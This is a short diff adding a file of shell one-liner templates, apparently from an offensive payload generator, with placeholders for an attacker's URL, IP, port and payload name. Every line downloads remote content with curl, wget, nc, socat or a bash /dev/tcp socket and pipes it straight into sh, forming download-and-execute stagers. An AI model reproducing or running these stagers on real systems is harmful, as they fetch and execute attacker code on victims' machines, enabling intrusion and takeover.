@@ -1,0 +1,9 @@
+curl -s #URL# | sh
+
+wget -qO- #URL# | sh
+
+printf 'GET /#PL_NAME#\\\\n\\\\n' | nc #IP# #WPORT# | sh
+
+printf 'GET /#PL_NAME#\\\\n\\\\n' | socat TCP:#IP#:#WPORT# - | sh
+
+bash -c 'exec 3<>/dev/tcp/#IP#/#WPORT#; printf "GET /#PL_NAME#\\\\n\\\\n">&3; cat <&3' | sh
